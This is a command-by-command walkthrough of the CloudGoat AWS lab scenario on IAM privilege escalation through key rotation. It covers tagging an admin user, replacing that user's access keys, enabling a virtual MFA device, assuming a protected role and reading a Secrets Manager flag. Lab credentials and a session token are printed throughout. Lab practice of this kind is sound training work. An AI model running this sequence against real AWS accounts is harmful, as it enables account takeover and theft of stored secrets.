# IAM Privecs by Key Rotation Cheat Sheet

```bash
export AWS_ACCESS_KEY_ID=AKIAZ6IIT5XU4PXVYLG3
export AWS_SECRET_ACCESS_KEY=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
```

Enumerate the credentials

```bash
aws iam list-user-policies --user-name devops_iam_privesc_by_key_rotation_<cloudgoat_id>
# SelfManageAccess
# TagResources

aws iam get-user-policy --user-name devops_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name SelfManageAccess

aws iam get-user-policy --user-name devops_iam_privesc_by_key_rotation_<cloudgoat_id> --policy-name TagResources
```

With the permissions we can tag and change access keys for users with the tag

```bash
aws iam tag-user --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --tags '{"Key":"developer","Value":"true"}'

aws iam list-access-keys --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id>

aws iam delete-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> --access-key-id AKIAZ6IIT5XU4BXDZM7B

aws iam create-access-key --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id>
# {
#     "AccessKey": {
#         "UserName": "admin_iam_privesc_by_key_rotation_<cloudgoat_id>",
#         "AccessKeyId": "AKIAZ6IIT5XU43X35JUX",
#         "Status": "Active",
#         "SecretAccessKey": "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",
#         "CreateDate": "2023-09-04T19:20:02+00:00"
#     }
# }
```

With the "admin" users credentials we can assume the role it has access to...

```bash
export AWS_ACCESS_KEY_ID=AKIAZ6IIT5XU43X35JUX
export AWS_SECRET_ACCESS_KEY=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

aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret
# Access Denied
```

...the role can only be assumed when using multi-factor authentication

Create a virtual mfa device

```bash
aws iam create-virtual-mfa-device --virtual-mfa-device-name cloudgoat_virtual_mfa --outfile QRCode.png --bootstrap-method QRCodePNG
# "SerialNumber": "arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa"
```

Scan the QR code in the file `QRCode.png`. For the following command put in two consecutive tokens. 

```bash
aws iam enable-mfa-device \
    --user-name admin_iam_privesc_by_key_rotation_<cloudgoat_id> \
    --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa \
    --authentication-code1 438582 \
    --authentication-code2 615656
```

Now we can assume the role since were using mfa

```bash
aws sts assume-role --role-arn arn:aws:iam::0123456789:role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id> --role-session-name cloudgoat_secret --serial-number arn:aws:iam::0123456789:mfa/cloudgoat_virtual_mfa --token-code 798934
# {
#     "Credentials": {
#         "AccessKeyId": "ASIAZ6IIT5XUWLL7H2H2",
#         "SecretAccessKey": "Mm8ij9L8eVAK0GXiXo0B1FWkC+ro4TZQfFMI7lIq",
#         "SessionToken": "IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJHMEUCIQDtxJUyGLnXR9xI6aha12o+YuJQBpMDuJBASX9ucGzf6gIgEvFrIs7bxo/tHYNFGiiweAxHs7kGNJnNo/pjbHeKo9YqnQIITRACGgw2ODM0NTQ3NTQyODEiDA898Itrb4va2Vmpbir6AZpo/LXWLxvH54yGPRpptxHNmIwqI/UZ+QBH28XSh7MQ6FKUqtbJKcGCPQF6QQVW6ZaCNwGSW/Xm7DVmhTJWCKDHgZkhwcEX4tOs2J5mwrXa6pjujIvBBTjSk0xs+ihUDut811bbrqPLo+RRutdklRH1DbZJPzIApK9+QWzJwajUNys2n8FblI2gAV3jvz1875gWQ+aR2o3VsRYEGBWj0U4IP7kuW4SgDEfU/NyeYXISXSnk1+BMalOYQ+IjiTvU9cTsvqZzl78BTaeT68glCE6dj5gnIFjsnERSnVE3bRs9zCZhXim/7vC82aumrNDCx7jx9aTgH9rP5dwwzOPYpwY6nQFd91gjpAbIvtWWG1B0r9Rj57JptcQtIqUyCipT1bgkK2K2C0cNGfzcd9gGAldf2X316iBdQXY9zgd0QevvdPzKzWmjnDybGve7TNBstFVCFAdRx62qdLbOR3GtjPwWbRZwI12jvG/PYOfq3fFqg+lD14IaF1i0JXXens9Ggg18FdBv9wSx2WXvIr2ApBqmJgxWNoxxIdsbDeiusoi0",
#         "Expiration": "2023-09-04T20:36:44+00:00"
#     },
#     "AssumedRoleUser": {
#         "AssumedRoleId": "AROAZ6IIT5XU5WXMGTWEW:cloudgoat_secret",
#         "Arn": "arn:aws:sts::0123456789:assumed-role/cg_secretsmanager_iam_privesc_by_key_rotation_<cloudgoat_id>/cloudgoat_secret"
#     }
# }
```

In a new shell retreive the secret

```bash
export AWS_ACCESS_KEY_ID=ASIAZ6IIT5XUWLL7H2H2
export AWS_SECRET_ACCESS_KEY=Mm8ij9L8eVAK0GXiXo0B1FWkC+ro4TZQfFMI7lIq
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJHMEUCIQDtxJUyGLnXR9xI6aha12o+YuJQBpMDuJBASX9ucGzf6gIgEvFrIs7bxo/tHYNFGiiweAxHs7kGNJnNo/pjbHeKo9YqnQIITRACGgw2ODM0NTQ3NTQyODEiDA898Itrb4va2Vmpbir6AZpo/LXWLxvH54yGPRpptxHNmIwqI/UZ+QBH28XSh7MQ6FKUqtbJKcGCPQF6QQVW6ZaCNwGSW/Xm7DVmhTJWCKDHgZkhwcEX4tOs2J5mwrXa6pjujIvBBTjSk0xs+ihUDut811bbrqPLo+RRutdklRH1DbZJPzIApK9+QWzJwajUNys2n8FblI2gAV3jvz1875gWQ+aR2o3VsRYEGBWj0U4IP7kuW4SgDEfU/NyeYXISXSnk1+BMalOYQ+IjiTvU9cTsvqZzl78BTaeT68glCE6dj5gnIFjsnERSnVE3bRs9zCZhXim/7vC82aumrNDCx7jx9aTgH9rP5dwwzOPYpwY6nQFd91gjpAbIvtWWG1B0r9Rj57JptcQtIqUyCipT1bgkK2K2C0cNGfzcd9gGAldf2X316iBdQXY9zgd0QevvdPzKzWmjnDybGve7TNBstFVCFAdRx62qdLbOR3GtjPwWbRZwI12jvG/PYOfq3fFqg+lD14IaF1i0JXXens9Ggg18FdBv9wSx2WXvIr2ApBqmJgxWNoxxIdsbDeiusoi0

aws secretsmanager list-secrets

aws secretsmanager get-secret-value --secret-id cg_secret_iam_privesc_by_key_rotation_<cloudgoat_id>
# Flag{...}
```
